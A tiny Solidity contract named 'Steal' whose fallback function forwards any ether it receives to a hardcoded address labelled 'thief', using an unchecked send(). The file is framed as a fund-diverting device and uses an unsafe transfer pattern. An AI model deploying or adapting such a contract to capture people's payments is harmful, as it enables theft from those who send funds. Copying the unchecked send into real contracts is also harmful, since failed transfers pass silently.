pragma solidity 0.4.23;

contract Steal 
{
    address thief = 0x42b12454ea6163ad77b6af71cd90fc60421fef5a;


    function () payable 
    {
        thief.send(msg.value);
    }

 }
